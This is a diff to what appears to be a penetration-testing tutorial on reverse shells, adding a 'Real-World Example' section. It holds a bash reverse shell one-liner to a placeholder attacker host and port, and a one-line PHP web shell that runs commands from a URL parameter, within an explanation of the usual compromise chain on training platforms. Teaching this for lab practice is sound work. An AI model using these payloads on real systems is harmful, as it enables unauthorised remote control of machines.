@@ -24,3 +24,12 @@ bash -i >& /dev/tcp/attacker_ip/4444 0>&1
 ```
 
 Once the victim runs that one line, the attacker gets a fully interactive bash session on the victim machine.
+
+## Real-World Example
+In web application pentesting, when an attacker finds a Remote Code Execution (RCE) vulnerability or a file upload that allows uploading a PHP web shell, the first thing they do is pop a reverse shell. For example after uploading a malicious PHP file:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+They use it to execute a reverse shell payload, turning a limited web shell into a full interactive terminal. From there they run LinPEAS (day 08), escalate privileges, and own the machine completely. This exact chain — RCE → reverse shell → privilege escalation — is the standard attack flow on platforms like HackTheBox and TryHackMe.
